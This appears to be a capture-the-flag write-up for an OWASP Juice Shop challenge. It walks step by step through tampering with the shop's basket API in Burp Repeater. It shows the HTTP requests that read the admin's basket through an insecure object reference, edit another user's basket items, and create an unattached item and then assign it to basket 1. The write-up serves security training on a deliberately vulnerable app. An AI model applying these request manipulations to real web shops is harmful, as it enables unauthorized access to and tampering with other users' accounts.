- Try adding items
- If adding new items to basket, see:
```
POST /api/BasketItems/ HTTP/1.1
[...]
{"ProductId":1,"BasketId":"2","quantity":1}
```
- Also, take note of this GET request as it may come in handy later `GET /rest/basket/2 HTTP/1.1` (notice the user id `2`). And the response
```
{"status":"success","data":{"id":2,"coupon":null,"UserId":2,"createdAt":"2026-07-10T13:35:23.716Z","updatedAt":"2026-07-10T13:35:23.716Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-07-10T13:35:23.578Z","updatedAt":"2026-07-10T13:35:23.578Z","deletedAt":null,"BasketItem":{"ProductId":1,"BasketId":2,"id":12,"quantity":1,"createdAt":"2026-07-11T03:17:56.017Z","updatedAt":"2026-07-11T03:17:56.017Z"}}]}}
```
- If adding an item that is already in the basket, see:
```
PUT /api/BasketItems/12 HTTP/1.1
[...]
{"quantity":2}
```
- Notice the `id` 12  (together with the response from the GET request earlier, it seems that it is the `id` of that specific product in the user's basket as it is different from the `productId`)
- Therefore, I think there will be 2 way to complete this challenge. 
	- The first one is to manipulate the POST request with different payload like `{"ProductId":1,"BasketId":"3","quantity":1}`
	- The second way is to manipulate the PUT request with different end point `PUT /api/BasketItems/9 HTTP/1.1` for instance.
- Send the POST request to burp repeater and change it as mentioned. See
```
HTTP/1.1 401 Unauthorized
[...]
{'error' : 'Invalid BasketId'}
```
- It seems that the developer handle this with proper authentication validation
- Try the PUT method. See
```
HTTP/1.1 500 Internal Server Error
[...]
{
  "error": {
    "message": "No such item found!",
    "stack": "Error: No such item found!\n    at /juice-shop/build/routes/basketItems.js:103:27"
  }
}
```
- Now, the GET request I noted down earlier comes in handy. Send it to Repeater and change it to `1` (admin)
- See the admin's basket items with their `id`s
```
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-07-10T13:35:23.716Z","updatedAt":"2026-07-10T13:35:23.716Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-07-10T13:35:23.578Z","updatedAt":"2026-07-10T13:35:23.578Z","deletedAt":null,"BasketItem":{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-07-10T13:35:23.751Z","updatedAt":"2026-07-10T13:35:23.751Z"}},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2026-07-10T13:35:23.578Z","updatedAt":"2026-07-10T13:35:23.578Z","deletedAt":null,"BasketItem":{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2026-07-10T13:35:23.751Z","updatedAt":"2026-07-10T13:35:23.751Z"}},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jpg","createdAt":"2026-07-10T13:35:23.578Z","updatedAt":"2026-07-10T13:35:23.578Z","deletedAt":null,"BasketItem":{"ProductId":3,"BasketId":1,"id":3,"quantity":1,"createdAt":"2026-07-10T13:35:23.751Z","updatedAt":"2026-07-10T13:35:23.751Z"}}]}}
```
- Now, do the PUT method again with `id` 1 `PUT /api/BasketItems/1 HTTP/1.1`
- See the response
```
{"status":"success","data":{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-07-10T13:35:23.751Z","updatedAt":"2026-07-10T13:35:23.751Z"}}
```
- Succeed. But the challenge is not completed.
- So maybe "additional product" means that I must add a new product!
- Try
```
PUT /api/BasketItems/1 HTTP/1.1
[...]
{
"ProductId":5,
"quantity":2
}
```
- See
```
HTTP/1.1 400 Bad Request
[...]
{"message":"null: `ProductId` cannot be updated due `noUpdate` constraint","errors":[{"field":"ProductId","message":"`ProductId` cannot be updated due `noUpdate` constraint"}]}
```
- The same happened when attempted to update `BasketId`
- Tested the POST request if it is vulnerable to SQL injection but all I got back was 401 or generic 500 errors like "No such product found!"
- This confirms that this endpoint is not vulnerable to SQL injection.
- Try deleting `BasketId` from the POST request
```
POST /api/BasketItems/ HTTP/1.1
[...]
{"ProductId":1,"quantity":1}
```
- The request went through
```
{"status":"success","data":{"id":24,"ProductId":1,"quantity":1,"updatedAt":"2026-07-11T05:03:29.404Z","createdAt":"2026-07-11T05:03:29.404Z"}}
```
- Now, the product with this `"id":24` is lying somewhere in the db without being attached to any user.
- Try to attach it to someone with PUT
```
PUT /api/BasketItems/24 HTTP/1.1
[...]
{
"BasketId":"1",
"quantity":2
}
```
- See
```
{"status":"success","data":{"ProductId":1,"BasketId":"1","id":24,"quantity":2,"createdAt":"2026-07-11T05:03:29.404Z","updatedAt":"2026-07-11T05:04:46.897Z"}}
```
- Yessssss! Complete the challenge.